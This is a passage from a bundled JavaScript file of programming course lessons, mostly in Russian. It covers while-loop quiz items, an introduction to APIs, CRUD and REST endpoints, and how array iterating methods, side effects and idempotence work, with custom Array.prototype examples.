'no' | no→→→\n\n◘◘![ico-25 hw]** 2**◘◘\n~~~js\nvar num = 1\n\nwhile (Math.random() < .5) {\n  num *= (num + 1)\n}\n~~~\n\n→→→ Will the loop be infinite? | 'yes', 'no' | no→→→\n\n◘◘![ico-25 hw]** 3**◘◘\n~~~js\nvar num = prompt('Enter the integer') - 0\nvar res = 0\n\nwhile (true) {\n  num >= 2 && res++\n  num /= 2\n  if (num < 2) {\n    console.log(`2 ** ${res} = ${2 ** res}`)\n    break\n  }\n}\n~~~\n\n→→→ What will be displayed in console if you type 8 in the modal window? | '', '2 ** 1 = 2', '2 ** 2 = 4', '2 ** 3 = 8', '2 ** 4 = 16' | 2 ** 3 = 8→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n~~~js\nvar num = prompt('Enter the integer') - 0\nvar res = 1\n\nwhile (true) {\n  res *= num--\n  if (num < 2) {\n    console.log(`Factorial: ${res}`)\n    break\n  }\n}\n~~~\n\n→→→ What will be displayed in console if you type 5 in the modal window? | 24, 0, 120, 20 | 120→→→\n\n________________\n\n[![ico-30 hw] **Quiz**](quiz/while)\n"},6912:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="\n#![ico-70 warn] 404\n\nFile Not Found\n\n----------\nНа жаль, запитаний вами матеріал не знайдено або не існує.\nЗверніться до розробника: irina.h.fylyppova@gmail.com\n\nUnfortunately, the material you've requested was not found or does not exist.\nPlease contact the developer: irina.h.fylyppova@gmail.com\n\nК сожалению, запрошенный вами материал не найден или не существует.\nОбратитесь к разработчику: irina.h.fylyppova@gmail.com\n"},44496:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] API\n\n[** ♫**](sounds/ua/api.mp3)\n\n**_Application Programming Interface_** (**API**) позволяет двум системам взаимодействовать друг с другом.\n\n@@@@\n![](illustrations/api-02.png)\nПредположим, существует некий внешний по отношению к вашему приложению набор сервисов, которые значительно расширяют функциональность вашего приложения.\nЕсли существует некий программный интерфейс, обеспечивающий вам доступ к этим сервисам, то это и есть **API**.<br>Т.е. вам не нужно включать эти сервисы в свое приложение, вам не важно, на каком языке они написаны, вам важно только знать, каким способом их активировать.\n![](illustrations/api-01.png)\n@@@@\n\n_________________________\n\nРаботая на клиенте, ваш код постоянно использует **браузерные API**<br>(например, **~DOM API~**, **~Audio API~**, **~Fetch API~**, **~File API~**, **~Notification API~**, **~IndexedDB API~**).\n\nКо многим веб-API вы можете подключиться удаленно\n(например, [![ico-70 firebase]](https://firebase.google.com/) or [![ico-35 google-maps]](https://developers.google.com/maps/documentation/javascript/)).\n_________________________\n\n## ![ico-25 icon] CRUD\n\n[** ♫**](sounds/ua/api-crud.mp3)\n\nКак правило, любое приложение взаимодействует со своим бекенд-API на сервере.\nБекенд-апи обеспечивает приложению доступ к данным, которые хранятся на сервере, с помощью методов **CRUD**.\n\n^^^[CRUD]\n\n**CRUD** (_create_, _read_, _update_, _delete_) — четыре основных типа запросов к серверу.\n\nДля идентификации типа запроса используется **метод доступа**, или **глагол**, который идентифицирует операцию с ресурсом.\n\n| **GET** | **POST** | **PUT** | **PATCH** | **DELETE** | **HEAD** |\n\n| ~read~   | **GET**    | получить данные                                     |\n| ~create~ | **POST**   | создание нового ресурса (новой записи)              |\n| ~update~ | **PUT**    | обновление существующего ресурса (записи)           |\n| ~update~ | **PATCH**  | частичное обновление существующего ресурса (записи) |\n| ~delete~ | **DELETE** | удаление ресурса                                    |\n| ~read~   | **HEAD**   | получение информации о ресурсе                      |\n\n^^При этом вас абсолютно не касается, как именно данные хранятся на сервере: в виде отдельных файлов, или в виде записей в базе данных.^^\n\n^^^\n____________________\n\n## ![ico-25 icon] Request & Response\n\n[** ♫**](sounds/ua/api-request-response.mp3)\n\nЛюбой API работают по принципу «запрос» — «ответ».\nВаше приложение посылает запрос, и если запрос валидный, то API присылает приложению ответ.\n\nФорма запроса зависит от API.\nЭто может быть метод, например, **~setTimeout~** или **~fetch~**.\nЭто может быть объект, свойства и методы которого обеспечивают вам доступ к возможностям браузерного API. Все объекты **~BOM~** и **~DOM~** являются элементами браузерного API.\nЭто может быть конструктор, с помощью которого вы создаете объекты, обеспечивающие вам доступ к возможностям браузерного API. Например, конструктор **~XMLHttpRequest~** или конструктор **~FileReader~**.\n\n__________________________________\n\n### ![ico-25 icon] Resource\n\n[** ♫**](sounds/ua/api-resource.mp3)\n\nГлавное при взаимодействии с серверным API - определить содержание понятия "ресурс" и присвоить каждому ресурсу уникальный идентификатор.\n\n^^Например, в качестве ресурса может выступать информация о юзере. Тогда, зная уникальный идентификатор ресурса, вы можете послать запрос серверному АПИ на получение данных юзера по его идентификатору (**GET**), можете послать запрос на изменение данных юзера (**PUT** или **PATCH**) или же отправить запрос на создание нового юзера (**POST**).^^\n\nТаким образом, при взаимодействии с удаленным API под термином "ресурс" мы подразумеваем **некий фрагмент информации, имеющий уникальный идентификатор.**\n\n^^Различие между **URL** (Uniform Resource Locator) и **URI** (Uniform Resource Identifier) заключается как раз в том, что URL указывает точное место расположения ресурса на сервере, а URI указывает только идентификатор ресурса, что обечпечивает большую гибкость серверного API в плане размещения данных и формы их хранения.^^\n\nРесурсом может быть файл, хранящийся на сервере, или отдельная запись в базу данных.\n\nНапример, на сервере может храниться файл изображения, но то же самое изображение может храниться в базе данных в виде текстовой строки в формате [**Base64**](https://www.base64encode.org/).\n\n_____________________________________\n\n## ![ico-25 icon] API endpoints\n\n[** ♫**](sounds/ua/api-endpoints.mp3)\n\nКаждый API имеет документацию и спецификации, которые определяют способ передачи информации.\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-01.png)\n^^^\n\nAPI-интерфейсы могут использовать HTTP-запросы для получения информации от веб-приложения или веб-сервера.\n\nВ случае REST API запрос осуществляется через интернет, и, принимает форму некоего веб-адреса, который называется **~endpoint~** (точка доступа к удаленному API).\n\n^^^[![](icons/endpoint-icon.png)]\n^^Понятие "endpoint" используется не только в контексте REST API, но и в более широком смысле в сфере информационных технологий и сетевых взаимодействий.^^\n\n^^• В сетевых протоколах endpoint может обозначать любую конечную точку связи в сети, будь то IP-адрес и порт в TCP/IP, или конечная точка в маршрутизации сообщений.^^\n^^• В SOAP (Simple Object Access Protocol) API endpoint также обозначает URL-адрес, к которому отправляются SOAP-сообщения. Это похоже на REST API, но используется в других протоколах и форматах данных.^^\n^^• В GraphQL API endpoint представляет собой одну конечную точку, через которую клиент может запрашивать конкретные данные, используя сложные запросы.^^\n^^• В микросервисах endpoint может обозначать любую точку входа для взаимодействия с отдельным микросервисом. Каждый микросервис может иметь свои собственные endpoints для различных функциональностей.^^\n^^• В более широком смысле, endpoint может обозначать любую точку, через которую осуществляется доступ к ресурсу или службе, будь то внутри системы или между различными системами.^^\n^^^\n\n**~endpoint~** - это URI-подобная строка, которую вам предоставляет API для удаленного доступа к ресурсам.\n\nДавайте разберемся, что же включает эта строка.\nНачнем с того, что сам **API** имеет **URL**,  например: https://api.example.com. И этот URL будет обязательно присутствовать в каждом **~endpoint~**.\nОднако для доступа к ресурсу нужно указать, какой именно ресурс вас интересует, и что вы хотите сделать с этим ресурсом (получить ресурс, создать новый, удалить или обновить существущий).\n**~endpoint~** содержит всю эту информацию.\n\nКак мы уже говорили ранее, каждый ресурс имеет уникальный идентификатор и с каждым ресурсом может быть выполнен ряд различных операций (чтение, создание, удаление, обновление/изменение).\n\nТаким образом, **~endpoint~** не является ни URL (поскольку не содержит информации о размещении ресурса), ни URI (поскольку включает в себя не только идентификатор ресурса, но и информацию об операции с ресурсом).\n\n![ico-25 warn] Если какая-то операция с ресурсом допустима, то для нее есть **~endpoint~**.\n![ico-25 warn] Если такого **~endpoint~** нет, то данная операция с ресурсом невозможна.\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-02.png)\n^^^\n\n^^^[![](icons/swagger.png)]\n![](illustrations/api-endpoints-04.png)\n^^^\n\n^^^[![](icons/coffee.png)]\n^^Рассмотрим пример с API ~https://api.example.com~.^^\n^^Предположим, на сервере хранится база данных юзеров.^^\n^^API позволяет получить список всех юзеров и предоставляет вам для этого **~endpoint~**:^^\n\n••https://api.example.com/users/all••\n\n^^Для получения информации конкретного юзера с уникальным идентификатором **iserId** эндпойнт будет уже другим:^^\n\n••https://api.example.com/users/${iserId}••\n\n\n^^Для создания нового юзера (**POST**):^^\n\n••https://api.example.com/user/create••\n\n^^Для полной замены всех данных юзера (**PUT**):^^\n\n••https://api.example.com/user/change/${iserId}••\n\n^^Для частичной модификации данных юзера (**PATCH**):^^\n••https://api.example.com/user/update/${iserId}••\n\n^^И для удаления юзера (**DELETE**):^^\n\n••https://api.example.com/user/remove/${iserId}••\n\n^^Серверный API парсит адрес запроса, и если эта строка соответствует одному из допустимых вариантов, и если у вас есть права на выполение таких операций, то ваш запрос выполняется.^^\n\n^^^\n\nEndpoint в REST API - это точка, к которой обращается клиент, чтобы взаимодействовать с сервером.\nОн представляет собой не просто URL-адрес, а совокупность адреса API и маршрута, который включает идентификатор ресурса и информацию о том, какое действие надо выполнить. Это как веб-адрес, но с дополнительными частями, которые указывают, что именно нужно сделать с данными.\n______________________________________________\n\n## ![ico-25 icon] web service\n\n**Терміни:**\n\n| ^^![ico-20 pin] **SOA** (**_Service Oriented Architecture_**) — сервис-ориентированная архитектура веб-приложений (набор архитектурных принципов).^^ |\n| ^^![ico-20 pin] **RPC** (**_Remote Procedure Call_**) — удаленный вызов процедуры.^^ |\n| ^^![ico-20 pin] **Сервис** (service) — набор операций, которые принимают запрос (_Request_) и выдают ответ (_Response_).^^ |\n| ^^![ico-20 pin] **Веб-сервис** — идентифицируемая веб-адресом программная система со стандартизироваными интерфейсами.^^ |\n\nВеб-сервисы могут взаимодействовать друг с другом и с другими приложениями с помощью уведомлений, основанных на определенных протоколах.\n\nНаибольшее распространение получили следующие протоколы реализации **_веб-сервисов_**:\n\n![ico-20 green-ok] **SOAP**    (_Simple Object Access Protocol_)\n![ico-20 green-ok] **REST**    (_Representational State Transfer_)\n![ico-20 green-ok] **XML-RPC** (_XML Remote Procedure Call_)\n\n_________________________________________\n\n### ![ico-20 icon] REST API\n\nОсновной принцип **REST** заключается в ограничении набора операций — используются только операции **CRUD** (~Create~ ~Read~ ~Update~ ~Delete~).\n\nАрхитектурный стиль **REST** в большинстве случаев подразумевает использование протокола HTTP.\n\nПоэтому команды CRUD преобразованы в  HTTP-методы  **POST** — **GET** — **PUT** — **DELETE**.\n\n^^^[![](icons/postman.png)]\n![](illustrations/api-rest-postman.png)\n^^^\n\n___________________________________________\n\n### ![ico-20 icon] SOAP vs REST\n\n**_API_** обычно классифицируются как **SOAP** или **REST**, и оба используются для доступа к веб-сервисам\n\n![ico-20 green-ok] **SOAP**: для обмена сообщениями используется формат XML\n![ico-20 green-ok] **REST**:  для получения или отправки информации используются URL-адреса\n\n**REST** использует четыре разных HTTP 1.1 глагола (~GET~, ~POST~, ~PUT~ и ~DELETE~)\n\nВ отличие от ~SOAP~, ~REST~ не обязательно должен использовать ~XML~ для предоставления ответа\n\nСуществуют веб-сервисы на основе REST, которые выводят данные в формате:\n\n| ^^• Command Separated Value (CSV)^^ |\n| ^^• JavaScript Object Notation (JSON)^^ |\n| ^^• Really Simple Syndication (RSS)^^ |\n\n^^Можно получить результат в формате, который легче парсить на языке вашего приложения^^\n\n_____________________________________\n'},83898:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# Принцип работы итерирующих методов\n\n[◄◄◄ Итерирующие методы массивов ◄◄◄](page/Array-iterating-methods.md)\n\nВыведя в консоль свойство **_~prototype~_** конструктора массивов, можно убедиться, что эти структуры данных наследуют много методов, и некоторые из них мы уже знаем.\n\n~~~js\nconsole.log(Array.prototype)\n~~~\n\n{{{Array-iteration-methods-theory.js}}}\n\nЧасть методов, с которыми мы уже знакомы, выполняют какую-то операцию с массивом.\n^^(добавляют элемент в массив, удаляют или заменяют элементы в массиве, объединяют несколько массивов в один и т.д.).^^\n\nИтерирующие методы перебирают элементы массива один за другим строго в порядке возрастания их индексов.\n^^(за исключением ~reduceRight~, который осуществляет перебор справа налево).^^\n\n_Группа итерирующих методов массивов - пример реализации функциональной парадигмы в ООП._\n\nГлавное, что нужно помнить про итерирующие методы массивов - это **функции высшего порядка**.\nЭто будет напоминать вам, что ![ico-20 warn] **первым и обязательным аргументом итерирующего метода является функция**.\n\n• метод будет перебирать элементы массива один за другим, пока не дойдет до конца массива.\n• на каждой итерации метод будет вызывать переданную ему функцию-аргумент.\n• при вызове функции-аргумента метод будет передавать ей значение текущего элемента массива.\n\n_____________________________________________\n\n## ![ico-25 icon] Декоратор цикла\n\nПреимущества методов перед операторами цикла очевидны.\nНапример, с помощью методов мы организовываем цепочные вычисления, а операторы цикла \"разбивают\" красивую цепочку, нарушая гармонию нашего кода.\n\nЦиклы требуют от нас достаточно много рутинной работы: нам нужно инициализировать переменную цикла, определить, как она будет изменяться на каждой итерации, контролировать ее значение, чтобы во-время завершить цикл. Короче говоря, создать механизм цикла своими руками. Мы даже не будем обсуждать возможные ошибки, возникающие при этом.\n\nЦиклы ~for...of~ и ~for...in~ значительно облегчили работу по итерированию массивов и объектов. Однако это все еще операторы цикла, а не методы.\n\nКогда мы \"заворачиваем\" цикл в функцию (метод), мы обеспечиваем возможность использования цепочных вычислений.\n\nИтак, итерирующие методы можно интерпретировать как функциональные \"обертки\" для цикла ~for...of~.\n\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nArray.prototype.iterate = function (func) {\n  for (const item of this) func(item)\n}\n\n;[7, 4, 1].iterate(console.log)\n~~~\n\nВ этом примере мы создали кастомный унаследованный метод массивов **~iterate~**\nс формальным параметром ~func~ (^^function^^),\nкоторый перебирает в цикле ~for...of~ исходный массив\nи на каждой итерации вызывает ~func~,\nпередавая ей очередной элемент исходного массива.\n\nВ этом примере метод **~iterate~** ничего не возвращает,\nи он не мутирует исходный массив, т.е. не производит внешних эффектов.\n\nТого же эффекта можно добиться с помощью рекурсии:\n\n~~~js\nArray.prototype.iterate = function (func, index) {\n  if (typeof func !== 'function') throw new TypeError('First argument is not a function.')\n  let number = typeof index === 'number' ? index : 0\n  func(this[number])\n  number++ < this.length - 1 && this.iterate.call(this, func, number)\n}\n\n;[7, 4, 1].iterate(console.log)\n~~~\n\n_____________________________________________\n\nЕсли мы хотим, чтобы метод возвращал новый массив, достаточно сделать следующее:\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js   \nArray.prototype.iterate = function (func) {\n  const res = []\n  for (const item of this) res.push(typeof func === 'function' ? func(item) : item)\n  return res\n}\n\n;[49, 4, 25].iterate(Math.sqrt)\n~~~\n\nРезультат:\n\n~~~console\n► (3) [7, 2, 5]\n~~~\n\nВ результате кастомный метод **~iterate~** будет \"собирать\" в массив ~res~\nрезультаты вызова функции ~func~ на каждой итерации,\nи возвращать массив ~res~.\n\n~~~js\nconst squaring = num => Math.pow(num, 2)\n;[7, 2, 5].iterate(squaring)\n~~~\n\nРезультат:\n\n~~~console\n► (3) [49, 4, 25]\n~~~\n\n_____________________________________________\n\nМы можем напилить кастомный метод, фильтрующий исходный массив в соответствии с заданным условием.\nТеперь функция ~func~ должна возвращать логическое значение.\nЕсли для очередного элемента массива функция ~func~ вернет ~true~, то этот элемент попадет в результирующий массив ~res~.\nВ противном случае - нет.\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nArray.prototype.filtering = function (func) {\n  const res = []\n  for (const item of this) func(item) && res.push(item)\n  return res\n}\n\nconst func = num => num < 10\n;[108, 24, 5, 17, 1, 7].filtering(func)\n~~~\n\nРезультат:\n\n~~~console\n► (3) [5, 1, 7]\n~~~\n\n~~~js   \n[7, 4, 1, 20, 8].filtering(item => item > 5)\n~~~\n\nРезультат:\n\n~~~console\n► (3) [7, 20, 8]\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Передача ссылок\n\nВ этом месте функциональная чистота итерирующих методов, к сожалению, заканчивается.\n**Ссылка - это \"отмычка\"**, и по ссылке функция может мутировать объект.\nПри этом, как правило, возникают побочные эффекты (side effects).\n\nЕсть два способа передачи ссылок в итерирующих методах массивов.\nПервый - передача ссылки на контекста вызова функции-аргумента вторым аргументом метода.\nВторой - передача ссылки на исходный массив самой функции-аргументу при вызове.\n\n### ![ico-20 icon] Второй аргумент метода\n\nКаждый метод может принимать два аргумента: функцию и ссылку на контекст вызова.\n\nКроме обязательного аргумента-функции, мы можем передать методу второй (опциональный) аргумент - ссылку на контекст вызова этой функции.\nПо сути, второй аргумент избавляет нас от необходимости явно биндить контект вызова функции, которая передается методу как аргумент.\n\n◘◘ ![ico-25 cap] ** 4** ◘◘\n~~~js\nconst numbers = [8, 4, 9, 7]\nconst alter = [7, 5, 0, 11]\n\nArray.prototype.iterate = function (callback, context) {\n  const res = []\n  for (const item of this) {\n    res.push(callback.call(context, item, this.indexOf(item), this))\n  }\n  return res\n}\n\nconst sample = numbers.iterate(function (item, index, arr) {\n  return this[index] + arr[index]\n}, alter)\n\nconsole.log(sample)\n~~~\n\nРезультат:\n\n~~~console\n► (4) [15, 9, 9, 18]\n~~~\n\n◘◘ ![ico-25 cap] ** 5** ◘◘\n~~~js\nconst numbers = [8, 4, 9, 7]\nconst alter = [-4, 1, -2, 0]\n\nArray.prototype.iterate = function (callback, context) {\n  const res = []\n  const func = callback.bind(context)\n  for (const item of this) res.push(func(item))\n  return res\n}\n\nconst sample = numbers.iterate(function (item) {\n  return item + this.shift()\n}, alter)\n\nconsole.log(sample)\n~~~\n\nРезультат:\n\n~~~console\n► (4) [4, 5, 7, 7]\n~~~\n\nОднако появляется побочный эффект - массив **alter** теперь пустой:\n\n~~~js\nconsole.log(alter) // []\n~~~\n\nЕще одно неудобство заключается в том, что при этом мы не можем передавать методу стрелочные функции, поскольку у них контекст вызова изменить невозможно.\nОднако стрелочные функции делают код более лаконичным.\n\n_____________________________________\n\n### ![ico-20 icon] Передача ссылки на исходный массив функции-аргументу\n\nФункция-аргумент может иметь три формальных параметра.\nПервый - это текущий элемент массива.\nВторой - это индекс текущего элемента массива.\nТретий - это ссылка на исходный массив.\n\nПередача этой \"отмычки\" функции-аргументу грубо разрушает функциональную чистоту метода и создает огромные возможности для побочных эффектов.\n\nСледующий пример показывает, как это работает.\n\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nconst numbers = [8, 4, 9, 7]\n\nArray.prototype.iterate = function (func) {\n  const res = []\n  let index = 0\n  for (const item of this) {\n    res.push(func(item, index++, this))\n  }\n  return res\n}\n\nconst sample = numbers.iterate((item, index, arr) => item * index - arr[0])\n\nconsole.log(sample)\n~~~\n\nРезультат:\n\n~~~console\n► (4) [-8, -4, 10, 13]\n~~~\n\n^^Функция **sample** получает в переменной **_arr_** ссылку на исходный массив **numbers**.^^\n\n___________________________________________________\n\n## ![ico-25 icon] Side effects\n\n![ico-20 warn] Чистые функции, какими, по идее, должны были быть итерирующие методы, не порождают внешних эффектов, т.е. не мутируют никакие внешние переменные.\nИтерирующие методы массивов - это функции высшего порядка, которые перебирают исходный массив, передавая функции-аргументу по очереди один элемент массива за другим.\nТаким образом, функция-аргумент не имеет ссылки на сам исходный массив, и не может его мутировать.\n_______________________\n![ico-20 warn] Исключение - если элементы исходного массива имеют **ссылочный тип данных**, т.е. функция-аргумент получает ссылку на элемент массива.\n______________________\nВозвращается всегда новый массив (или не массив, как мы увидим позже, или вообще ничего).\nИсходный массив, как правило, не изменяется.\nТ.е. изначально это должны были быть чистые функции, не порождающие внешних эффектов, что их отличает от обычных методов массивов, таких как ~push()~, ~concat()~ и т.д.\n\nНо мы уже показали ранее, что эта функциональная чистота нарушается передачей ссылок (методу - на контекста вызова функции-аргумента и на исходный массив - функции-аргументу).\n\nАналогично, если мы имеем дело с **глубокими структурами данных**, то происходит передача не значений, а ссылок, что создает возможность возникновения побочных эффектов.\n\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~js\nconst users = [\n  { name: 'Helen', age: 25 },\n  { name: 'Robert', age: 18 },\n  { name: 'Mary', age: 20 },\n  { name: 'Piter', age: 30 }\n]\n\nArray.prototype.iterate = function (func) {\n  for (const item of this) func(item)\n}\n\nusers\n  .iterate(user => user.age++)\n~~~\n\nВ этом примере мы итерируем массив объектов, т.е. имеем дело с глубокой структурой данных.\nНа каждой итерации функция-аргумент (~user => user.age++~) метода **~iterate~** получает ссылку на объект.\nЭто дает ей возможность мутировать исходный массив, поскольку\n\n☼☼☼ ссылка - это отмычка ☼☼☼\n\nВ результате выполнения кода массив **users** будет таким:\n\n~~~console\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {name: 'Helen', age: 26}\n  ► 1: {name: 'Robert', age: 19}\n  ► 2: {name: 'Mary', age: 21}\n  ► 3: {name: 'Piter', age: 31}\n    length: 4\n  ► [[Prototype]]: Array(0)\n~~~\n\nМы видим, что возраст всех юзеров изменился, хотя мы не передавали ссылку на исходный массив **users**.\nНо массив **users** является глубокой структурой данных, и его элементы имеют ссылочный тип,\nпоэтому функция-аргумент (~user => user.age++~) метода **~iterate~** получила \"отмычку\" и смогла мутировать объекты по сслыке.\n\nИтак, side effects возникают вследствие передачи ссылок вместо значений.\n\n_____________________________________________\n\nСледующий пример показывает, что можно мутировать и саму функцию-аргумент:\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\nvar browsers = ['Chrome', 'FireFox', 'Opera', 'Safari', 'Edge']\n\nconst storeItem = function (item, index, arr) {\n  this.history = Array.isArray(this.history) ? this.history : []\n  this.history.push(item)\n}\n\nArray.prototype.iterate = function (func) {\n  for (var item of this) func.call(func.prototype, item)\n}\n\nbrowsers.iterate(storeItem, storeItem)\n\nconsole.dir(storeItem)\n~~~\n\nРезультат в консоли:\n\n~~~console\n▼ ƒ storeItem(item, index, arr)\n  ▼ history: Array(5)\n      0: \"Chrome\"\n      1: \"FireFox\"\n      2: \"Opera\"\n      3: \"Safari\"\n      4: \"Edge\"\n      length: 5\n    ► __proto__: Array(0)\n    arguments: null\n    caller: null\n    length: 3\n    name: \"storeItem\"\n  ► prototype: {constructor: ƒ}\n  ► __proto__: ƒ ()\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Идемпотентность\n\nЕсли метод при одном и том же значении аргументов возвращает один и тот же результат, то он **_идемпотентен_**.\n\n^^т.е. при повторном вызове метода с одним и тем же массивом и функцией результат всегда будет одним и тем же.^^\n\nВ объектно-ориентированных языках идемпотентность методов практически недостижима, если аргументы функции являются ссылочным типом данных.\nПоскольку массивы являются ссылочным типом, итерирующие методы работают со ссылкой, а не с коллекцией данных.\nСсылка остается той же самой, но от одного вызова метода до другого содержимое массива могло измениться, что отразится на результате.\n\nДавайте попробуем создать идемпотентный метод:\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\nconst numbers = [25, 16, 9, 49, 81, 64, 4]\n\nArray.prototype.idempotence = function (func) {\n  const res = []\n  if (!this.initialState) this.initialState = JSON.parse(JSON.stringify(this))\n  for (const item of this.initialState) res.push(func(item))\n  return res\n}\n\nnumbers.idempotence(Math.sqrt)\n~~~\n\nРезультат:\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\nПри первом вызове метода **~idempotence~** с данным массивом метод мутирует массив, добавляя ему свойство ~initialState~ и сохраняя в этом свойстве ссылку на исходное состояние массива.\n\nПри повторном вызове метод игнорирует все измения, которые могли произойти с массивом за время между первым и вторым вызовом метода, и работает с клоном ~initialState~.\n\n~~~js\nnumbers[6] = 125\n\nnumbers.idempotence(Math.sqrt)\n~~~\n\nРезультат:\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\nЗаметим, что при этом каждый раз метод будет возвращать новую ссылку, поскольку при каждом вызове метод создает новый массив, однако содержимое этого массива будет одним и тем же.\n\nДля чистоты эксперимента можно возвращать JSON-строку свойства ~initialState~.\n\n~~~js\nArray.prototype.idempotence = function (func) {\n  const res = []\n  if (!this.initialState) this.initialState = JSON.parse(JSON.stringify(this))\n  for (const item of this.initialState) res.push(func(item))\n  return JSON.stringify(res)\n}\n~~~\n\nОднако в данном примере мы использовали идемпотентный метод **~Math.sqrt~**.\n\nЕсли же мы передадим методу **~idempotence~** функцию, которая не является идемпотентной, то метод не будет идемпотентным, поскольку при вызове с одним и тем же набором аргументов он будет возвращать различный результат:\n\n~~~js\nnumbers.idempotence(item => item + Math.floor(Math.random() * 100))\n~~~\n\nВ этом примере видно, что если функция, которую мы передаем методу **~idempotence~**, не является _идемпотентной_, то и результат работы метода будет варьировать, т.е. идемпотентность метода напрямую зависит от идемпотентности функции-аргумента.\n\nПопробуем исправить эту ситуацию:\n\n◘◘![ico-20 cap] **10**◘◘\n~~~js\nconst numbers = [25, 16, 9, 49, 81, 64, 4]\n\nArray.prototype.idempotence = function (func) {\n  if (!this.initialState) {\n    this.result = []\n    this.initialState = JSON.parse(JSON.stringify(this))\n    for (const item of this.initialState) this.result.push(func(item))\n  }\n\n  return JSON.stringify(this.result)\n}\n\nnumbers.idempotence(Math.sqrt)\n~~~\n\nРезультат:\n\n~~~console\n'[5,4,3,7,9,8,2]'\n~~~\n\n~~~js\nnumbers.idempotence(item => item + Math.floor(Math.random() * 100))\n~~~\n\nРезультат:\n\n~~~console\n'[5,4,3,7,9,8,2]'\n~~~\n\n__________________________________\nПопробуйте самостоятельно разобраться в следующем примере.\n\n^^^[![](icons/coffee.png) 11]\n~~~js\nArray.prototype.idempotence = function (func) {\n  const funcArg = func.toString()\n  try {\n    var sourceData = JSON.stringify(this)\n  } catch (err) {\n    console.warn(err)\n    return null\n  }\n\n  const self = this.__proto__\n\n  if (!self.funcs) self.funcs = []\n  if (!self.data) self.data = []\n  if (!self.results) self.results = []\n\n  if (!self.funcs.includes(funcArg)) self.funcs.push(funcArg)\n  if (!self.data.includes(sourceData)) self.data.push(sourceData)\n\n  const index = self.funcs.indexOf(funcArg)\n  const num = self.data.indexOf(sourceData)\n\n  if (!self.results[num]) self.results[num] = []\n\n  if (!self.results[num][index]) {\n    const result = []\n    for (const item of this) {\n      result.push(func(item))\n    }\n    self.results[num][index] = result\n  }\n\n  return self.results[num][index]\n}\n~~~\n^^^\n\n~~~js\nconst numbers = [25, 16, 9, 49, 81, 64, 4]\nnumbers.idempotence(Math.sqrt)\n~~~\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\n~~~js\n[25, 16, 9, 49, 81, 64, 4].idempotence(Math.sqrt)\n~~~\n\n~~~console\n► (7) [5, 4, 3, 7, 9, 8, 2]\n~~~\n\n~~~js\nnumbers.idempotence(item => item + Math.floor(item + Math.random() * 100))\n~~~\n\n~~~console\n► (7) [87, 98, 42, 128, 184, 152, 79]\n~~~\n\n~~~js\nconst randomize = item => item + Math.floor(item + Math.random() * 100)\n[25, 16, 9, 49, 81, 64, 4].idempotence(randomize)\n~~~\n\n~~~console\n► (7) [87, 98, 42, 128, 184, 152, 79]\n~~~\n\n_____________________________________________\n\n## ![ico-25 icon] Примеры\n\nПередача контекста вызова\n\n◘◘![ico-20 cap] **11**◘◘\n~~~js\nconst jobs = [\n  'developer',\n  'worker',\n  'salesman',\n  'manager'\n]\n\nconst users = [\n  { name: 'Piter', job: 1 },\n  { name: 'Helen', job: 2 },\n  { name: 'Robert', job: 0 },\n  { name: 'Michael', job: 1 },\n  { name: 'Andrew', job: 0 },\n  { name: 'Mary', job: 2 },\n  { name: 'Gregory', job: 3 },\n]\n\nArray.prototype.iterate = function (func, context) {\n  if (typeof func !== 'function') throw new TypeError('First argument should be the function.')\n\n  const result = []\n  for (const item of this) result.push(func.call(context, item))\n  return result\n}\n\nfunction showUser (user) {\n  return `<p>${user.name}: ${this[user.job]}</p>`\n}\n\ndocument.body\n  .appendChild(document.createElement('div'))\n  .innerHTML = users.iterate(showUser, jobs).join('')\n~~~\n\n_____________________________\n\nПередача функции-аргументу второго (опционального) параметра (индекса текущего элемента массива).\n\n◘◘![ico-20 cap] **12**◘◘\n\n~~~js\nconst salary = [4000, 3200, 4500, 2800, 3500, 2400, 3700]\n\nconst workers = ['Piter', 'Helen', 'Robert', 'Michael', 'Andrew', 'Mary', 'Gregory']\n\nArray.prototype.iterate = function (func, context) {\n  if (typeof func !== 'function') throw new TypeError('First argument should be the function.')\n\n  const result = []\n  index = 0\n  for (const item of this) result.push(func.call(context, item, index++))\n  return result\n}\n\nfunction showSalary (worker, index) {\n  return `<p>${worker}: ${this[index]}</p>`\n}\n\ndocument.body\n  .appendChild(document.createElement('div'))\n  .innerHTML = workers.iterate(showSalary, salary).join('')\n~~~\n\n__________________________________________\n\n◘◘![ico-20 cap] **13**◘◘\n\n~~~js\nconst arr = [\n  'google',\n  'service',\n  'user',\n  () => Math.round(Math.random() * 1000),\n  false\n]\n\nfunction test (elem, index, ref) {\n  typeof elem === 'function' && ref.splice(index, 1, elem())\n  return ref[index]\n}\n\nArray.prototype.iterate = function (func) {\n  var res = []\n  for (var item of this) res.push(func(item, this.indexOf(item), this))\n  return res\n}\n\narr.iterate(test)\n~~~\n__________________________________________\n\n\nИспользуем второй и третий опицональные параметры функции-аргумента:\n\n◘◘![ico-20 cap] **14**◘◘\n\n~~~js\nconst companList = ['Google', 'Mozilla', 'Microsoft']\nconst browsers = ['Chrome', 'Firefox', 'Edge']\n\nfunction test (prop, index) {\n  this[index] = { [prop] : this[index] }\n}\n\nArray.prototype.iterate = function (func, context) {\n  var index = index && typeof index === 'number' ? index : 0\n  for (var item of this) func.call(context, item, index++)\n}\n\ncompanList.iterate(test, browsers)\n\nconsole.log(browsers)\n~~~\n\nРезультат в консоли:\n\n~~~console\n▼ (3) [{…}, {…}, 